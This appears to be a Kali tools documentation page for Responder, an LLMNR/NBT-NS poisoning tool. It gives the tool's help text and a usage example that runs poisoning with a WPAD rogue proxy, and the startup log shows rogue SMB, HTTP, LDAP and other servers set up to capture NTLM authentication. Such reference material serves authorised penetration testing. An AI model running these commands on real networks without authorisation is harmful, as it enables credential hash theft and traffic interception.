# Responder 
## NBT-NS/LLMNR Responder

This tool is first an LLMNR and NBT-NS responder, it will answer to *specific* NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answers to File Server Service request, which is for SMB. The concept behind this, is to target our answers, and be stealthier on the network. This also helps to ensure that we don’t break legitimate NBT-NS behavior. You can set the -r option to 1 via command line if you want this tool to answer to the Workstation Service request name suffix.

```
root@kali:~# responder -h
Usage: python /usr/bin/responder -i 10.20.30.40 -b On -r On

Options:
-h, --help show this help message and exit
-A, --analyze Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests from which workstation to
which workstation without poisoning anything.
-i 10.20.30.40, --ip=10.20.30.40
The ip address to redirect the traffic to. (usually
yours)
-I eth0, --interface=eth0
Network interface to use
-b Off, --basic=Off Set this to On if you want to return a Basic HTTP
authentication. Off will return an NTLM
authentication.This option is mandatory.
-r Off, --wredir=Off Set this to enable answers for netbios wredir suffix
queries. Answering to wredir will likely break stuff
on the network (like classics 'nbns spoofer' will).
Default value is therefore set to Off
-f Off, --fingerprint=Off
This option allows you to fingerprint a host that
issued an NBT-NS or LLMNR query.
-w On, --wpad=On Set this to On or Off to start/stop the WPAD rogue
proxy server. Default value is Off
-F Off, --ForceWpadAuth=Off
Set this to On or Off to force NTLM/Basic
authentication on wpad.dat file retrieval. This might
cause a login prompt in some specific cases. Default
value is Off
--lm=Off Set this to On if you want to force LM hashing
downgrade for Windows XP/2003 and earlier. Default
value is Off
-v More verbose
responder Usage Example

Specify the IP address to redirect to (-i 192.168.1.202), enabling the WPAD rogue proxy (-w On), answers for netbios wredir (-r On), and fingerprinting (-f On):
```

## Usage Example
```
root@kali:~# responder -i 192.168.1.202 -w On -r On -f On
NBT Name Service/LLMNR Responder 2.0.
Please send bugs/comments to: lgaffie@trustwave.com
To kill this script hit CRTL-C

[+]NBT-NS &amp; LLMNR responder started
[+]Loading Responder.conf File..
Global Parameters set:
Responder is bound to this interface:ALL
Challenge set is:1122334455667788
WPAD Proxy Server is:ON
WPAD script loaded:function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
HTTP Server is:ON
HTTPS Server is:ON
SMB Server is:ON
SMB LM support is set to:OFF
SQL Server is:ON
FTP Server is:ON
IMAP Server is:ON
POP3 Server is:ON
SMTP Server is:ON
DNS Server is:ON
LDAP Server is:ON
FingerPrint Module is:ON
Serving Executable via HTTP&amp;WPAD is:OFF
Always Serving a Specific File via HTTP&amp;WPAD is:OFF
```